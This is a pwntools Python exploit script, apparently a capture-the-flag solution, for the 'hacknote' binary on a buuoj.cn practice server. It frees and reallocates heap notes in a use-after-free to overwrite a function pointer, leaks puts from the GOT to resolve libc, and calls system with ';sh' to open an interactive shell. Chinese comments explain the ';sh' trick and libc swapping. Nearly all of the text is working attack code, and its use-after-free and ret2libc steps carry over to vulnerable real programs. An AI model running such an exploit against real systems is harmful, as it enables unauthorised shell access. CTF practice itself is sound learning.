from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './hacknote'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',29407) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件



def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b':',b'1')
    sla(b':',int2bytes(len))
    sa(b':',content)

def show(index):
    sla(b':',b'3')
    sla(b':',int2bytes(index))
#
# def edit(index,content):
#     sla(b':',b'2')
#     sla(b':',int2bytes(index))
#     sa(b':',content)

def delete(index):
    sla(b':',b'2')
    sla(b':',int2bytes(index))

puts_got = elf.got['puts']
put_fun = 0x0804862B

add(0x80)#0
add(0x80)#1
delete(1)
delete(0)

payload = p32(put_fun) + p32(puts_got)
add(0x8, payload)#2
show(1)
puts_addr = uu32(r(4))
log.success('puts_addr', puts_addr)

system_addr, bin_sh_addr = ret2libc(puts_addr, 'puts')

delete(2)
# payload = p32(system_addr) + p32(bin_sh_addr)
payload = p32(system_addr) + b';sh\x00'
#关于这里为什么不是bin_sh_addr而是;sh\x00，一开始我纠结了好久都没想通
#突然发现之前没注意到puts(arg0+4)的+4是在put_fun中将传入参数指针+4
#即本身是note_puts(arg0)，现在将note_puts换成system，所以就成了system(arg0)
#而不是system(arg0+4)，arg0就是system自己的地址，所以只能用;将字符串截断然后sh
add(0x8, payload)#4

show(1)
itr()